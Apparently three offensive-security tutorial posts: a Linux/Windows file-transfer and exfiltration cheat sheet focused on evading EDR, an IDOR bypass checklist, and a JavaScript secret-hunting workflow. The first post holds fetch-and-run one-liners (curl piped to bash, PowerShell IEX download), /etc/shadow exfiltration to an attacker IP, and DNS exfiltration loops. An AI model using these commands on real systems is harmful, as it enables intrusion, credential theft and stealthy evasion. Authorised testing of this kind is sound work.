File transfer cheat sheet: Linux ↔ Windows, quietly

The unflashy skill that wins engagements — moving a file onto a box in a limited shell without lighting up EDR.

Some of the most important offensive skills aren't flashy. Transferring a file without alerting endpoint defences, or getting one exploit onto a box in a stripped-down shell, is where the quiet skills shine. This is the full reference — every method worth muscle memory, with notes on detection and when each one fits.

Contents: 1. Serve · 2. Pull (Linux) · 3. Pull (Windows) · 4. SMB · 5. SCP/SFTP · 6. FTP · 7. Base64 paste · 8. Netcat · 9. /dev/tcp (bash built-in) · 10. SSH tunnelling · 11. DNS exfil · 12. Exfiltration · OPSEC

1. Serve the file (attacker host)

# HTTP — one-liner
python3 -m http.server 80

# Upload-capable (also receives files back from the target)
pip install uploadserver && python3 -m uploadserver 80

# PHP quick server
php -S 0.0.0.0:80

# Ruby one-liner
ruby -run -e httpd . -p 80

2. Pull to a Linux target

# Standard
wget http://10.10.14.1/x -O /tmp/x
curl http://10.10.14.1/x -o /tmp/x

# Quieter: pipe straight into bash (fileless)
curl -s http://10.10.14.1/s.sh | bash

# If curl/wget are stripped
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.1/x','/tmp/x')"
perl -e 'use LWP::Simple; getstore("http://10.10.14.1/x","/tmp/x")'

# Busybox (IoT, containers, minimal installs)
busybox wget http://10.10.14.1/x -O /tmp/x

3. Pull to a Windows target

Prefer native, lower-signature methods first. certutil and bitsadmin still work but are heavily monitored by EDR.

# PowerShell — native, quieter than certutil
iwr http://10.10.14.1/x.exe -OutFile C:\Windows\Temp\x.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/x.exe','x.exe')

# Fileless — execute in memory, nothing written to disk
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')

# Start-BitsTransfer — uses BITS service, survives reboots
Start-BitsTransfer -Source http://10.10.14.1/x.exe -Dest C:\Temp\x.exe

# curl.exe ships with Windows 10+
curl.exe http://10.10.14.1/x.exe -o x.exe

# Loud but reliable (expect EDR detection)
certutil -urlcache -f http://10.10.14.1/x.exe x.exe
bitsadmin /transfer j http://10.10.14.1/x.exe C:\Windows\Temp\x.exe

4. SMB

Modern Windows blocks guest SMB, so share with credentials.

# Attacker — stand up an authenticated share
impacket-smbserver share . -smb2support -username a -password a

# Target — mount and copy
net use \\10.10.14.1\share /user:a a
copy \\10.10.14.1\share\x.exe .

# Unmount when done (cleanup)
net use \\10.10.14.1\share /delete

5. SCP / SFTP

When you have SSH access and just need to move a file. Native, encrypted, and usually not flagged.

# Push to target (from attacker)
scp x.bin user@10.10.10.5:/tmp/x.bin

# Pull from target (from attacker)
scp user@10.10.10.5:/etc/shadow ./shadow

# SFTP interactive session
sftp user@10.10.10.5

6. FTP

Useful when HTTP is blocked but FTP egress is open. Stand up a quick server and pull.

# Attacker — pyftpdlib one-liner
python3 -m pyftpdlib -w -p 21

# Target — Linux
wget ftp://10.10.14.1/x -O /tmp/x

# Target — Windows (script mode, no interactive)
echo open 10.10.14.1 21 > ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get x.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -s:ftp.txt

7. No network / limited shell — base64 paste

When there's no outbound network, paste the file as a base64 string.

# Linux: encode to one line
base64 -w0 payload.bin ; echo

# Linux: decode on target
echo "<paste>" | base64 -d > payload.bin

# Windows: encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe"))

# Windows: decode
[IO.File]::WriteAllBytes("x.bin",[Convert]::FromBase64String("<paste>"))

# Windows: certutil can also decode base64
certutil -decode encoded.b64 decoded.exe

8. Netcat

# Receiver (attacker or target — whoever is listening)
nc -lvnp 4444 > file.out

# Sender
nc -q0 10.10.14.1 4444 < file.in

# If -q is unavailable (BSD netcat), use -w timeout
nc -w3 10.10.14.1 4444 < file.in

# Encrypted with ncat (nmap's netcat)
ncat --ssl -lvnp 4444 > file.out      # receiver
ncat --ssl 10.10.14.1 4444 < file.in   # sender

9. /dev/tcp (bash built-in, no tools needed)

When the target has bash but nothing else. No binary required.

# Download a file using only bash
exec 3<>/dev/tcp/10.10.14.1/80
echo -e "GET /x HTTP/1.0\r\nHost: 10.10.14.1\r\n\r\n" >&3
cat <&3 > /tmp/x
exec 3>&-

10. SSH tunnelling for restricted networks

When only SSH is allowed out. Forward a local port to your attack server.

# Local port forward: target:8888 → attacker:80
ssh -L 8888:127.0.0.1:80 user@10.10.14.1 -N -f

# Then on target, download through the tunnel
curl http://127.0.0.1:8888/x -o /tmp/x

# Reverse: open a port on the attacker that tunnels to target
ssh -R 9999:127.0.0.1:445 user@10.10.14.1 -N -f

11. DNS exfil (last resort, slow)

When all TCP/HTTP egress is blocked, but DNS resolves. Encodes data in subdomain labels.

# Concept: split file into chunks, query your DNS server
for chunk in $(xxd -p loot.txt | fold -w 60); do
  nslookup $chunk.exfil.yourdomain.com
done

# Attacker catches the queries with a DNS listener
# Tools: dnscat2, iodine, or a simple tcpdump on port 53

12. Exfiltration: target → attacker

# HTTP upload (attacker runs uploadserver from step 1)
curl -F file=@/etc/shadow http://10.10.14.1/upload
Invoke-RestMethod -Uri http://10.10.14.1/upload -Method Post -InFile loot.zip

# Exfil over HTTPS (if you have a cert)
curl -k -F file=@loot.tar.gz https://10.10.14.1/upload

# Exfil via SMB (write back to your share)
copy C:\loot.zip \\10.10.14.1\share\loot.zip

OPSEC notes

  • Egress matters. Test which ports your foothold can reach. Outbound 445 (SMB), 80/443 and 53 (DNS) are filtered differently on every network.
  • Signature vs native. certutil, bitsadmin and mshta downloads are classic EDR detections. Native curl.exe/iwr and in-memory loads are quieter.
  • Encrypt sensitive loot before it crosses the wire. Zip with a password or use openssl enc.
  • Clean up artifacts when you're done — certutil cache, temp files, FTP scripts, SMB mount points.
  • Log awareness. Every method above leaves traces somewhere (process creation, network connections, DNS queries). Know what your method logs and whether the SOC is watching.
  • Only run this against systems you are authorised to test.

IDOR is more than 9 → 10: a 403/404 bypass checklist

Changing an ID is the warm-up. Authorization bugs fail quietly, so when the swap returns 403/404, these are the bypasses to reach for.

If your IDOR testing stops at changing an ID from 9 to 10, you're scratching the surface. Say you're user 10, /api/v2/users/10 works, but /api/v2/users/9 returns 403 or 404. That refusal is often shallow. Work this checklist against the blocked request.

Path normalisation

/api/v2/users/9/            # trailing slash
/api/v2/users//9//         # doubled slashes
/api/v2/users/9//
/api/v2/users/9.json       # extension appended
/api/v2/users/9;           # matrix/param suffix
/api/v2/users/%2e/9        # encoded dot segment

Version & sibling endpoints

/api/v1/users/9/           # version downgrade (older, laxer authz)
/api/v1/users/9/home       # alternate action under the object
/api/internal/users/9      # forgotten sibling route

ID format confusion

/api/v1/users/09           # leading zero
/api/v1/users/0x9          # hex
/api/v1/users/9.0          # float
/api/v1/users/10,9         # list — may return both
/api/v1/users?id=10&id=9   # parameter pollution
/api/v1/users/9abc         # trailing garbage tolerated by the parser

Encoding

/api/v2/users/%209         # encoded space
/api/v2/users/9%00         # null byte
/api/v1/users/%2539        # double URL-encoding (%25 -> %)

Method & header tricks

# Flip the verb — read authz is sometimes stricter than write
GET -> POST / PUT, or X-HTTP-Method-Override: GET

# Front-end path override headers (when a proxy trusts them)
X-Original-URL: /api/v2/users/9
X-Rewrite-URL: /api/v2/users/9

Then: prove it's real, not a false positive

A 200 is not the finding. A bypass only counts when the response contains the victim's data — at least two or three owner-bound fields (email, UUID, created_at, account number) that are not yours. Confirm with three requests: your own object (baseline 200), the victim object (the attack), and a random non-existent ID (control 404). If the "victim" response just echoes your own data or the ID back, it's a false positive, not an IDOR.

Fix

Enforce object-level authorization server-side on every route, keyed to the authenticated session, after canonicalising the path. Normalise before you authorise, never after.

JavaScript analysis for AppSec: a repeatable workflow

Where to start when a target hands you a wall of JavaScript — collect, dedupe, filter live, then hunt secrets and endpoints.

Client-side JavaScript leaks more than people think: forgotten endpoints, deprecated routes, feature flags, and the occasional hard-coded key. This is a pipeline you can run on any target.

1. Collect from Burp

In Burp's HTTP history, filter by MIME type script or URL ending .js, then copy all the JavaScript URLs to burp-js.txt.

2. Pull historical JS from the Wayback Machine

curl -sG "https://web.archive.org/cdx/search/cdx" \
  --data-urlencode "url=example.com/*" \
  --data-urlencode "output=text" \
  --data-urlencode "fl=original" \
  --data-urlencode "collapse=urlkey" | grep -i '\.js$' > wayback-js.txt

# or, broader historical URL sources
gau example.com | grep '\.js$' >> wayback-js.txt

3. Merge and dedupe

cat burp-js.txt wayback-js.txt | sort -u > all-js.txt

4. Keep only live files

cat all-js.txt | httpx -silent -mc 200 -o live-js.txt

5. Hunt secrets — grep first pass

while read url; do
  echo "[+] $url"
  curl -s "$url" | grep -Eio \
  'api[_-]?key|secret|token|authorization|password|jwt|bearer|aws_access_key_id|aws_secret_access_key|firebase|private_key|client_secret'
done < live-js.txt

6. Then the dedicated tools

cat live-js.txt | mantra                 # fast key/token scanner
cat live-js.txt | jsleak -s -l -k        # secrets + links
trufflehog filesystem ./js --only-verified   # verified-only, low noise
nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt

7. Extract endpoints

xnLinkFinder -i live-js.txt -o endpoints.txt
# or the BurpJSLinkFinder extension for in-tool discovery

8. Don't skip source maps

If a .js.map is reachable, you can reconstruct the original, unminified source — variable names, comments, routes and all. That is often the single richest artifact on the whole target. Beautify what you can't map (js-beautify) and read for hidden parameters, role checks, and API routes the UI never calls.

The point

Feed every endpoint you find back into your scope and your proxy. JavaScript recon isn't a one-off scan; it's how you build the real map of an application's attack surface.
